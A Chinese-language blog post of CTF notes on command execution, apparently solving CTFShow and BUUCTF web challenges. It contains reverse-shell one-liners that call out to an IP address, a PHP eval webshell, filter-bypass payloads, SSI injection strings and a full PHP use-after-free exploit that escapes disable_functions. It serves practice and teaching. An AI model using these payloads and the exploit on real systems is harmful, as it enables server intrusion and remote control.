---
title: CTFShow-命令执行
date: 2022-01-15 19:44:46
updated: 2023-01-15 19:44:46
tags: RCE
categories: CTFShow
toc: true
good_article: true
---

常见RCE的命令和bypass

<!-- more -->

### 一、知识点

```bash
nc 124.223.44.100 12345 -e /bin/sh
bash -i >& /dev/tcp/124.223.44.100/6666 0>&1
bash -c "bash -i >& /dev/tcp/124.223.44.100/6666 0>&1"
```

php一些rce函数

- 读取文件：`readfile()` `file_get_contents()` `show_source()` `echo include()+php伪协议` `highlight_file()`
- 打印当前所有变量：`get_defined_vars()`
- 扫描目录：`scandir()`
- 重命名文件：`rename('','')`





#### 常见操作命令

- 常见命令执行函数
  - system()
  - passthru()
  - exec()
  - shell_exec()
  - `反引号
  - ob_start()

- 1.查看文件

  - **<font color='red'>linux查看文件命令</font>**![](https://api2.mubu.com/v3/document_image/9d92c7b7-692a-4245-bb71-e28aae82ea48-10191865.jpg)

  - <font color='red'>windows：type flag.txt</font>

- 2.查找文件
  - [linux查找文件](https://blog.csdn.net/xxmonstor/article/details/80507769)

  - find命令![img](https://api2.mubu.com/v3/document_image/894f7bfb-df81-4091-bd7b-ef0076719340-10191865.jpg)

- 3.写入文件

  - \>是覆写，>>是追加
- `echo "<?php @eval($_POST["cmd"]);?>">shell.php`

#### 绕过技巧

- <font color='red'>1.管道符</font>

  - linux![](https://api2.mubu.com/v3/document_image/b2056527-0ac9-41ea-a4c7-5686aa631e44-10191865.jpg)

  - windows![](https://api2.mubu.com/v3/document_image/4cb6c028-a1a3-4564-b692-4d2c65ddcc7a-10191865.jpg)

- <font color='red'>2.空格</font>

  - <  重定向符 or > <>
  - \$IFS$9
  - `$IFS`
  - `${IFS}`
  - %20
  - %09(需要php环境)
  
- <font color='red'>3.前后缀</font>

  - %0a 换行符(php环境)

  - %00 截断

  - %20%23

- **<font color='red'>4.黑名单绕过</font>**

  - 1.拼接：a=c;b=at;c=fl;d=ag;`$a$b $c$d`

  - 2.base64编码
    - echo "Y2F0IGZsYWc="|base64 -d (该编码为cat)
    
    - echo "Y2F0IGZsYWc="|base64 -d|bash (在bash被过滤的情况下可尝试sh)
    
  - 3.单双引号：c""at fl''ag
  
  - 4.反斜线：c\at fl\ag
  
  - 5.正则![](https://api2.mubu.com/v3/document_image/8f8ca449-d18f-497b-b5da-e05dba2b1b5e-10191865.jpg)
  
- <font color='red'>5.其他技巧</font>

  - 1.内联执行---就是将``或$()内命令的输出作为输入执行

    - cat\$IFS$9\`ls`

    - cat\$IFS$9$(ls)

  - 2.文件构造绕过

    利用ls -t和>以及换行符绕过长度限制执行命令(文件构造绕过)

    - ![](https://api2.mubu.com/v3/document_image/e587b377-1752-445d-9285-bea15b567c22-10191865.jpg)

### 二、实战(精题)-ctfshow

#### web32-36

```php+HTML
<?php
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
```

重点是过滤了：分号和左括号，`;`过滤时可以用 `?>` 结尾代替

可以采用include/require和\$_POST来进行逃逸，再用php伪协议读取任意文件

```bash
?c=include%0a$_POST[1]?>
?c=include$_POST[a]?>
POST: 1=php://filter/convert.base64-encode/resource=flag.php
```

也可以写成`?c=include%0a$_POST[a]?>`，a不需要用引号括起来

#### web37-39

这题需要包含flag.php，但是被过滤了

```php+HTML
<?php
	if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
```

可以用php伪协议中的data协议执行rce:

注重：**浏览器不识别+号**，所以编码的php代码有+号需要 **对+再次进行url编码**，或者直接去掉原代码结尾的 ?>

```php
?c=data://text/plain,<?php eval($_POST[1]);?> 进行一句话木马的执行
POST: 1=system('cat flag.php');

?c=data://text/plain,<?=eval($_POST[1]);?> 短标签绕过php过滤
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg== 编码执行
```

#### web40 通过变量数组达到RCE

```php
if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
```

可以看到过滤了很多东西，上面的方法都不能使用，注意上面过滤的是**中文括号**

能用的：分号，下划线，字母，括号……

官方hint方法：`?c=show_source(next(array_reverse(scandir(pos(localeconv())))));`

其他方法(ctfshow视频教程):

1.尝试拿到当前所有变量：`print_r(get_defined_vars());`

![](https://s2.loli.net/2022/01/16/eCjvQzmRxnLalM3.png)

2.可以使用`current()`和`next()`获取数组中的对象，再用`array_pop()`弹出值并执行，因为此题并没有过滤eval函数

![](https://s2.loli.net/2022/01/16/rmH3nF4UDSRWP7V.png)

最终使用payload:`?c=eval(array_pop(next(get_defined_vars())));`，在POST里即可RCE



#### web41 字符串构造rce(脚本)

```php
phpinfo();
('phpinfo')();
```

效果相同

hint：https://blog.csdn.net/miuzzx/article/details/108569080

#### web46 %09 %0a 管道符使用

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
```

payload: `tac%09fla?.php%0a` 或者 `tac%09fla?.php&&ls`注意要将&&或者||URL编码-->`tac%09fla?.php%26%26ls`

此处的%09和%0a自动解码后不包含数字，所以不会被过滤，闭合或者注释掉后面的重定向写入即可回显

#### web50 nl< ''使用

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
```

过滤了%09和%26(&)，无法绕过空格了。

可以使用不带空格的读取方式绕过 `nl<fla''g.php||`，nl不支持?通配符

#### web52 空格替代

```php
if(!preg_match("/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
```

payload: `nl$IFS/fla''g||`

视频学到的姿势：(可能会用得到)

- 文件复制: `cp flag.php a.txt`    `cp${IFS}fla?g.php${IFS}a.txt`
- 文件命名: `mv flag.php a.txt`    `cp${IFS}fla?g.php${IFS}a.txt`

#### web54 过滤引号过滤

```php
if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
```

官方payload: `/bin/?at${IFS}f???????`

别人的payload：`paste${IFS}fla?.php`



#### web55 无字母数字rce

```php
if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
```

- `source filename`和 `. filename` 可以在linux下执行脚本文件
- 构造POST提交网页，可以往php服务器里提交脚本文件
- 一般来说这个文件在linux下面保存在`/tmp/php??????`一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）

随便上传文件，然后抓包修改为脚本文件，再添加参数`?c=. /???/????????[@-[]`，形成竞争
**注：后面的`[@-[]`是linux下面的匹配符，是进行匹配的大写字母。**

此处没有过滤特殊符号以及空格

![](https://s2.loli.net/2022/01/19/sVjHNiByPx8Cquv.png)

#### web57 符号运算拼凑36

```php
//flag in 36.php
if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
        system("cat ".$c.".php");
```

payload:`$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))`

注意取反的时候会减一，即要在`$((~$((37))))`

原理是：
`${_}=""`

`$(())=0`

`~$(())=~0`

`$((~$(())))=-1`

`然后拼接出-36在进行取反`

注意的是：`${_}会输出上一次的执行结果`

#### 绕过opendir()

https://www.cnblogs.com/LLeaves/p/13210005.html





#### web72 glob:// 和 uaf脚本

```php
<?php
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
```

这道题有严格的disable_function限制和open_basedir限制。

先利用glob://伪协议绕过open_basedir,找到`/`下的所有文件

```php
c=?><?php
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
} exit(0);?>
```

发现flag0.txt

接着用uaf脚本去突破disable_functions的限制执行命令

> 如果有基本函数被过滤，可以考虑手写一个不重名的基本脚本

```php
c=function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
```

```
strlen()被ban
重写：
function strlen_u($s){
    $n = 0;
    while($s[$n++]){
    }
    return $n-1;
}
```



#### web118 shell的字符串截取

参考：http://c.biancheng.net/view/1120.html

使用`${#}`获取变量字符串长度。

```bash
${string: start :length}
${string:~0} 或者 ${string:~A}都是取最后一个字符
```

其中，string 是要截取的字符串，start 是起始位置（从左边开始，从 0 开始计数），length 是要截取的长度（省略的话表示直到字符串的末尾）

此题利用PATH和PWD构造出 nl 命令，再配合通配符，读取flag.php

```bash
${PWD}          /var/www/html
${PWD:~0}     l
${PATH}         /bin
${PATH:~0}    n
${PATH:~A}${PWD:~A}$IFS????.???
```



#### web119 更多路径构造命令

提供一个fuzzy测试脚本：

```python
import requests
import string
url = "http://1260c402-b071-4fae-99c2-0b86eff2036e.challenge.ctf.show/"
list = string.ascii_letters+string.digits+"$+-#}{_><:?*.~/\\ "
white_list = ""
for payload in list:
    data = {
        "code" : payload
    }
    res = requests.post(url, data=data)
    if "evil input" not in res.text:
        print(payload)
        white_list += payload
print(white_list.replace(" ","空格"))
# 白名单：ABCDEFGHIJKLMNOPQRSTUVWXYZ$#}{_:?.~空格
```

```bash
PHP_CFLAGS=-fstack-protectcor-strong-fpic-fpie-o2-D_LARGEFILE_SOURCE -D_FI LE_OFFSET_BITS=64
PHP_VERSION=7.3.22
SHLVL=1
```

```bash
0:
${#}
1:
${##}
${#SHLVL}
3-5:
${#RANDOM}
/:
${HOME:${#}:${##}}
${PWD:${#}:${##}}
${PWD::${#SHLVL}}
t:
${HOME:${#HOSTNAME}:${#SHLVL}}
```

所以可以构造payload:(此题PATH被过滤了)

```bash
/bin/cat flag.php
code=${HOME:${#}:${##}}???${HOME:${#}:${##}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???
/bin/base64 flag.php
code=${HOME:${#}:${##}}???${HOME:${#}:${##}}?????${#RANDOM} ????.???
code=${HOME:${#}:${##}}???${HOME:${#}:${##}}?????${PHP_CFLAGS:~A} ????.???
```

#### web120-121 过滤HOME PATH

```bash
/bin/cat flag.php
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.???
/bin/base64 flag.php
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???
```

#### web122 过滤#号

$?表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误

<A执行后，`$?`的值为1，再用random进行尝试

```bash
code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
```

这里可以尝试自己写个脚本直到测试成功

```python
import requests
import string
url = "http://b1084b3c-a96b-4ba1-a7df-d2dc69a40e4b.challenge.ctf.show/"
payload = "<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???"
data = {
        "code" : payload
    }
res = requests.post(url, data=data)
while(len(res.text)==3069):
    res = requests.post(url,data=data)
print(res.text)
```

#### web124 以数字和不敏感函数构造敏感函数

```
base_convert(37907361743,10,36) ===>hex2bin
hex2bin(dechex(1598506324))=======>_GET
$base_convert(37907361743,10,36)(dechex(1598506324))=======>$_GET
```

再利用白名单中的函数名当做变量名，即可构造出类似`$_GET[A]($_GET[B])`的形式，即可调用system('ls')

```
$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{sin}($$pi{cos})&sin=system&cos=nl flag.php
```



#### 随便总结

读取文件的函数

```php
highlight_file($filename);
show_source($filename);
print_r(php_strip_whitespace($filename));
print_r(file_get_contents($filename));
readfile($filename);
print_r(file($filename)); // var_dump
fread(fopen($filename,"r"), $size);
include($filename); // 非php代码
include_once($filename); // 非php代码
require($filename); // 非php代码
require_once($filename); // 非php代码
print_r(fread(popen("cat flag", "r"), $size));
print_r(fgets(fopen($filename, "r"))); // 读取一行
fpassthru(fopen($filename, "r")); // 从当前位置一直读取到 EOF
print_r(fgetcsv(fopen($filename,"r"), $size));
print_r(fgetss(fopen($filename, "r"))); // 从文件指针中读取一行并过滤掉 HTML 标记
print_r(fscanf(fopen("flag", "r"),"%s"));
print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组
```

获取目录

```php
print_r(glob("*")); // 列当前目录
print_r(glob("/*")); // 列根目录
print_r(scandir("."));
print_r(scandir("/"));
$d=opendir(".");while(false!==($f=readdir($d))){echo"$f\n";}
$d=dir(".");while(false!==($f=$d->read())){echo$f."\n";}
$a=glob("/*");foreach($a as $value){echo $value."   ";}
$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
```



### 三、BUUCTF实战题

#### [极客大挑战 2019]RCE ME

参考：https://blog.csdn.net/mochu7777777/article/details/105136633

知识点：URL编码取反绕过

```php
echo urlencode(~'phpinfo'); //%8F%97%8F%96%91%99%90
(~%8F%97%8F%96%91%99%90)(); //phpinfo();
```

查看关键信息，

![](https://s2.loli.net/2022/04/19/vozuLP7ngMN5REs.png)



尝试构造shell连接蚁剑

```php
assert(eval($_POST["cmd"]));

?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9C%92%9B%DD%A2%D6%D6);
```

在根目录发现flag和readflag文件，但无法读取，猜测要执行readflag。

此处按照网上的教程，可以使用蚁剑的绕过disable_functions的插件，从而执行命令

<img src="https://s2.loli.net/2022/04/19/vlPbKt4NMYohCIT.png" style="zoom: 67%;" />

这两个经测试都可以，然后执行/readflag即可





#### [BJDCTF2020]EasySearch

**知识点：SSI注入**

扫描目录发现index.php.wap源码：

```php
<?php
    ob_start();
    function get_hash(){
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
        $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
        $content = uniqid().$random;
        return sha1($content); 
    }
    header("Content-Type: text/html;charset=utf-8");
    ***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
            ***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
            echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
    }else
    {
    ***
    }
    ***
?>
```

用脚本跑出password的合适取值：

```python
import hashlib
def md5(s):
    return hashlib.md5(s.encode('utf-8')).hexdigest()
for i in range(1, 10000000):
    if md5(str(i)).startswith('6d0bc1'):
        print(i) //2020666
        break
```

password=2020666&username=12并没有明显的回显。尝试抓包发现：

![](https://s2.loli.net/2022/04/19/BEh7PbUQSX81TMD.png)

访问后发现12被写入文件了，跟源码逻辑一致，此题写入的是shtml，搜索得知使用ssi注入方式：

```php
username=<!--#exec cmd="ls ../"-->&password=2020666
username=<!--#exec cmd="nl ../flag_990c66bf85a09c664f0b6741840499b2"-->&password=2020666
```















